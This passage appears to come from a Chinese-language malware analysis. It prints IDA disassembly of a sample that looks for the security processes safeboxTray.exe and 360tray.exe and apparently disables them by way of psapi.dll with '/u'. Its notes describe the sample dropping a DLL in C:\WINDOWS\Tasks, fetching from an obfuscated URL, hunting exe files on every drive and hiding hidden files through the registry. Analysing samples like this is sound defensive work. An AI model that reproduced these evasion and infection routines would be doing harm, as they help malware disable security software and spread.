
```
seg001:00415580                 sub     esp, 130h

seg001:00415586                 push    ebp

seg001:00415587                 push    offset aSTO     ; "檎卣雄饧嘏蹘迷?

seg001:0041558C                 call    sub_415020      ; safeboxTray.exe

seg001:00415591                 push    offset aIkvfrUc ; "┆嗤銝塑?

seg001:00415596                 call    sub_415020      ; 360tray.exe

seg001:0041559B                 push    offset aCcR     ; "骁余讱卧?

seg001:004155A0                 call    sub_415020      ; psapi.dll

seg001:004155A5                 push    offset CommandLine ; "枺?

seg001:004155AA                 call    sub_415020      ;  /u

seg001:004155AF                 add     esp, 10h

seg001:004155B2                 push    0               ; th32ProcessID

seg001:004155B4                 push    2               ; dwFlags

seg001:004155B6                 call    CreateToolhelp32Snapshot

seg001:004155BB                 mov     ebp, eax

seg001:004155BD                 cmp     ebp, 0FFFFFFFFh

seg001:004155C0                 jz      loc_415737

seg001:004155C6                 lea     eax, [esp+134h+pe]

seg001:004155CA                 push    esi

seg001:004155CB                 push    eax             ; lppe

seg001:004155CC                 push    ebp             ; hSnapshot

seg001:004155CD                 mov     [esp+140h+pe.dwSize], 128h

seg001:004155D5                 call    Process32First

seg001:004155DA                 test    eax, eax

seg001:004155DC                 jz      loc_415711

seg001:004155E2                 mov     esi, lstrcmpiA

seg001:004155E8                 lea     ecx, [esp+138h+pe.szExeFile]

seg001:004155EC                 push    offset aSTO     ; "檎卣雄饧嘏蹘迷?

seg001:004155F1                 push    ecx             ; lpString1

seg001:004155F2                 call    esi ; lstrcmpiA

seg001:004155F4                 test    eax, eax

seg001:004155F6                 jz      short loc_41561B

seg001:004155F8

seg001:004155F8 loc_4155F8:                             ; CODE XREF: sub_415580+99 j

seg001:004155F8                 lea     edx, [esp+138h+pe]

seg001:004155FC                 push    edx             ; lppe

seg001:004155FD                 push    ebp             ; hSnapshot

seg001:004155FE                 call    Process32Next

seg001:00415603                 test    eax, eax

seg001:00415605                 jz      loc_415711

seg001:0041560B                 lea     eax, [esp+138h+pe.szExeFile]

seg001:0041560F                 push    offset aSTO     ; "檎卣雄饧嘏蹘迷?

seg001:00415614                 push    eax             ; lpString1

seg001:00415615                 call    esi ; lstrcmpiA

seg001:00415617                 test    eax, eax

seg001:00415619                 jnz     short loc_4155F8 ; 进程是否存在 safeboxTray.exe

seg001:0041561B

seg001:0041561B loc_41561B:                             ; CODE XREF: sub_415580+76 j

seg001:0041561B                 mov     ecx, [esp+138h+pe.th32ProcessID]

seg001:0041561F                 push    ebx             ; lpFileName

seg001:00415620                 push    ecx             ; dwProcessId

seg001:00415621                 push    0               ; bInheritHandle

seg001:00415623                 push    410h            ; dwDesiredAccess

seg001:00415628                 call    OpenProcess

seg001:0041562E                 mov     ebx, eax

seg001:00415630                 test    ebx, ebx

seg001:00415632                 jz      loc_4156FE

seg001:00415638                 lea     edx, [esp+13Ch+cbNeeded]

seg001:0041563C                 push    edi

seg001:0041563D                 push    edx             ; lpcbNeeded

seg001:0041563E                 lea     eax, [esp+144h+hObject]

seg001:00415642                 push    4               ; cb

seg001:00415644                 push    eax             ; lphModule

seg001:00415645                 push    ebx             ; hProcess

seg001:00415646                 call    EnumProcessModules

seg001:0041564B                 mov     ecx, [esp+140h+hObject]

seg001:0041564F                 push    104h            ; nSize

seg001:00415654                 push    offset ApplicationName ; lpFilename

seg001:00415659                 push    ecx             ; hModule

seg001:0041565A                 push    ebx             ; hProcess

seg001:0041565B                 call    GetModuleFileNameExA

seg001:00415660                 mov     edi, offset ApplicationName

seg001:00415665                 or      ecx, 0FFFFFFFFh

seg001:00415668                 xor     eax, eax

seg001:0041566A                 mov     esi, offset ApplicationName

seg001:0041566F                 repne scasb

seg001:00415671                 not     ecx

seg001:00415673                 dec     ecx

seg001:00415674                 mov     edi, offset aSTO ; "檎卣雄饧嘏蹘迷?

seg001:00415679                 mov     edx, ecx

seg001:0041567B                 or      ecx, 0FFFFFFFFh

seg001:0041567E                 repne scasb

seg001:00415680                 not     ecx

seg001:00415682                 dec     ecx

seg001:00415683                 mov     edi, offset FileName

seg001:00415688                 sub     edx, ecx

seg001:0041568A                 push    offset FileName ; lpFileName

seg001:0041568F                 mov     ecx, edx

seg001:00415691                 mov     eax, ecx

seg001:00415693                 shr     ecx, 2

seg001:00415696                 rep movsd

seg001:00415698                 mov     ecx, eax

seg001:0041569A                 xor     eax, eax

seg001:0041569C                 and     ecx, 3

seg001:0041569F                 rep movsb

seg001:004156A1                 mov     edi, offset aCcR ; "骁余讱卧?

seg001:004156A6                 or      ecx, 0FFFFFFFFh

seg001:004156A9                 repne scasb

seg001:004156AB                 not     ecx

seg001:004156AD                 sub     edi, ecx

seg001:004156AF                 mov     esi, edi

seg001:004156B1                 mov     edx, ecx

seg001:004156B3                 mov     edi, offset FileName

seg001:004156B8                 or      ecx, 0FFFFFFFFh

seg001:004156BB                 repne scasb

seg001:004156BD                 mov     ecx, edx

seg001:004156BF                 dec     edi

seg001:004156C0                 shr     ecx, 2

seg001:004156C3                 rep movsd

seg001:004156C5                 mov     ecx, edx

seg001:004156C7                 and     ecx, 3

seg001:004156CA                 rep movsb

seg001:004156CC                 call    sub_414F40

seg001:004156D1                 add     esp, 4

seg001:004156D4                 test    al, al
```

5、`C:\WINDOWS\Tasks`释放1文件，该文件其实是一个`dll`，主要从`b9dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8W2)9%4b7X3u0D9L8$3y4C8k6h3c8Q4y4@1c8%4N6%4N6Q4x3X3g2Z5L8$3S2G2i4K6u0V1x3W2)9J5k6h3y4F1i4K6u0r3k6r3!0%4L8W2)9J5c8X3N6J5i4K6u0W2k6i4S2W2i4@1f1@1i4@1t1^5i4K6S2n7i4@1f1^5i4@1u0p5i4@1u0p5i4@1f1^5i4K6R3H3i4K6R3#2i4@1f1%4i4K6V1%4i4K6R3#2i4@1f1$3i4@1q4r3i4K6V1J5`。

```
seg001:0041691D                 call    sub_41630E      ; C:\WINDOWS\Tasks释放1文件
```

6、遍历磁盘分区，查找`exe`文件

```
push    esi             ; lpThreadId

seg001:0041692B                 push    esi             ; dwCreationFlags

seg001:0041692C                 push    esi             ; lpParameter

seg001:0041692D                 push    offset find_file_exe ; lpStartAddress

seg001:00416932                 push    esi             ; dwStackSize

seg001:00416933                 push    esi             ; lpThreadAttributes

seg001:00416934                 call    CreateThread
```

7、查找`AfxControlBar42s`窗口，修改注册表键值，关闭“显示隐藏文件”
